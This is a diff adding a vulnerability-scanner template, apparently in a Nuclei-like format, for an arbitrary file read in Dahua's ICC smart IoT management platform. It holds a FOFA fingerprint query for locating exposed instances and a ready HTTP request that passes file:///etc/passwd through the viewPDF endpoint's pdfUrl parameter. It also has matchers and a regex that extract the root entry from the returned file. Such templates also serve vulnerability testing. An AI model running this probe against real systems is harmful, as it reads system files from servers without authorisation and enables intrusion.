@@ -1,0 +1,24 @@
+## id: VEID-2025-1210
+## name: 大华ICC智能物联综合管理平台viewPDF存在任意文件读取
+## author: hack007x
+## severity: high
+## tags: veid,file,veid2025
+## description: 该漏洞出现在viewPDF?filename=x.pdf&pdfUrl=file: 可任意文件按读取
+## fofa-query: body="location.hash.indexOf('/authLogin')" || body="客户端会小于800" || title="智能物联综合管理平台" || body="* 客户端会小于800*" || body="/static/fontshd/font-hd.css"
+## verification: true
+
+
+GET /evo-apigw/evo-cirs/material/viewPDF?filename=x.pdf&pdfUrl=file:///etc/passwd HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+
+#@ condition: and
+#@ matcher: status_code == 200
+#@ matcher: header["Content-Type"] contains "pdf"
+#> extract: name=passwd_root, from=body, regex=/(root:[^\n]+)/, group=1
+
+
+
+
+
+# @VEIL-STAMP: 4049602cc4913c64ff75afb63a0c5a60821b329e2deeade8c8b2874b8f5da94a
